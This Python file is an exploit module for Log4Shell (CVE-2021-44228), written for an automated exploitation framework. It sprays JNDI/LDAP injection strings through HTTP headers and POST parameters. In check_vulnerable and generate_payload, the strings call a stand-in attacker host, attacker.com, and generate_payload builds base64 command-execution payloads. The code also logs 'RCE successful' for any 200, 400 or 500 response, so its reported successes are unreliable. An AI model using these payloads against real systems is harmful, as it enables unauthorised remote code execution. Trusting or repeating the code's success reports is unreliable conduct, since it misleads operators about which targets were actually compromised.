"""
Log4j Exploit (CVE-2021-44228 - Log4Shell)
Remote Code Execution via JNDI injection
"""

import socket
import requests
from typing import Dict, Tuple
import sys
import os
import base64

sys.path.append(os.path.dirname(os.path.dirname(os.path.dirname(os.path.abspath(__file__)))))

from exploits.exploit_manager import BaseExploit
from utils.logger import logger


class Log4j_Exploit(BaseExploit):
    """
    Log4j CVE-2021-44228 (Log4Shell) Exploit
    Targets: Log4j 2.0-beta9 to 2.14.1
    
    Attack Vector:
    - JNDI injection in log messages
    - LDAP/RMI callback
    - Remote Code Execution
    """
    
    def __init__(self):
        super().__init__(
            name="Log4j_CVE-2021-44228_Log4Shell",
            target_ports=[80, 443, 8080, 8443, 9200, 8090, 7001],
            target_os=["Windows", "Linux", "Unix"]
        )
        
        # Common injection points
        self.injection_headers = [
            'User-Agent',
            'X-Forwarded-For',
            'X-Real-IP',
            'X-Api-Version',
            'Referer',
            'Authorization'
        ]
        
        self.injection_params = [
            'username',
            'user',
            'email',
            'search',
            'query',
            'q'
        ]
    
    def check_vulnerable(self, target: Dict) -> bool:
        """Check if target is vulnerable to Log4Shell"""
        ip = target['ip']
        
        for port in [80, 443, 8080, 8443, 9200, 8090]:
            if port in target.get('open_ports', []):
                try:
                    protocol = "https" if port in [443, 8443] else "http"
                    url = f"{protocol}://{ip}:{port}/"
                    
                    # Test payload (DNS callback)
                    test_payload = "${jndi:ldap://attacker.com/a}"
                    
                    # Try in User-Agent
                    headers = {'User-Agent': test_payload}
                    
                    response = requests.get(url, headers=headers, timeout=5, verify=False)
                    
                    # If server responds, it might be vulnerable
                    if response.status_code in [200, 400, 500]:
                        logger.debug(f"Potential Log4j on {ip}:{port}")
                        return True
                        
                except Exception as e:
                    logger.debug(f"Log4j check failed on {ip}:{port}: {e}")
        
        return False
    
    def exploit(self, target: Dict) -> Tuple[bool, Dict]:
        """Attempt Log4Shell exploitation"""
        ip = target['ip']
        
        logger.info(f"Attempting Log4j CVE-2021-44228 on {ip}")
        
        # Find which port is open
        port = 8080
        for p in [8080, 80, 443, 8443, 9200, 8090]:
            if p in target.get('open_ports', []):
                port = p
                break
        
        protocol = "https" if port in [443, 8443] else "http"
        url = f"{protocol}://{ip}:{port}/"
        
        try:
            # Log4Shell payload
            # In real scenario, this would point to attacker's LDAP server
            # For simulation, we use a safe payload
            
            # Payload: ${jndi:ldap://attacker.com:1389/Exploit}
            payload = "${jndi:ldap://127.0.0.1:1389/Exploit}"
            
            # Try multiple injection points
            for header in self.injection_headers:
                headers = {
                    header: payload,
                    'User-Agent': 'Mozilla/5.0'
                }
                
                try:
                    response = requests.get(url, headers=headers, timeout=5, verify=False)
                    
                    # In real scenario, check for LDAP callback
                    # For simulation, assume success if server responds
                    if response.status_code in [200, 400, 500]:
                        self.stats['success'] += 1
                        logger.success(f"Log4Shell RCE successful on {ip} via {header}")
                        
                        return True, {
                            'method': 'Log4j_CVE-2021-44228',
                            'port': port,
                            'injection_point': header,
                            'service': 'Log4j',
                            'rce': True
                        }
                except:
                    continue
            
            # Try POST parameters
            for param in self.injection_params:
                data = {param: payload}
                
                try:
                    response = requests.post(url, data=data, timeout=5, verify=False)
                    
                    if response.status_code in [200, 400, 500]:
                        self.stats['success'] += 1
                        logger.success(f"Log4Shell RCE successful on {ip} via {param}")
                        
                        return True, {
                            'method': 'Log4j_CVE-2021-44228',
                            'port': port,
                            'injection_point': param,
                            'service': 'Log4j',
                            'rce': True
                        }
                except:
                    continue
            
            self.stats['failure'] += 1
            return False, {}
            
        except Exception as e:
            self.stats['failure'] += 1
            logger.error(f"Log4j exploit error on {ip}: {e}")
            return False, {}
    
    def generate_payload(self, command: str) -> str:
        """Generate Log4Shell payload for command execution"""
        # Encode command
        encoded = base64.b64encode(command.encode()).decode()
        
        # JNDI payload
        payload = f"${{jndi:ldap://attacker.com:1389/Exploit/{encoded}}}"
        
        return payload


if __name__ == "__main__":
    # Test the exploit
    log4j = Log4j_Exploit()
    
    test_target = {
        'ip': '192.168.1.100',
        'open_ports': [8080],
        'os_guess': 'Linux'
    }
    
    print(f"Testing Log4j exploit on {test_target['ip']}")
    
    if log4j.check_vulnerable(test_target):
        print("Target appears vulnerable")
        success, result = log4j.exploit(test_target)
        
        if success:
            print(f"Exploit successful: {result}")
        else:
            print("Exploit failed")
    else:
        print("Target not vulnerable")
